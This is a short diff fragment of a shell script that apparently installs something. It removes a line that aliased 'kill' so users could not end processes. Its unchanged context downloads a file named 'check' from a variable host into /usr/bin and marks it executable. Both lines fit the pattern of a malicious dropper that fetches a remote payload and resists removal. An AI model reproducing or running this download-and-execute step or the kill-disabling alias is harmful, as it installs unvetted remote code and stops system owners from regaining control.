@@ -36,7 +36,6 @@ echo
 echo "Let's Go Forward... :)"
 echo
 echo "-----------------------------------------------------------------------------"
-alias kill='echo "Sorry, the kill command is disabled."'
 echo "-----------------------------------------------------------------------------"
 echo
 cd /usr/bin && wget http://$IP/check && chmod +x check 
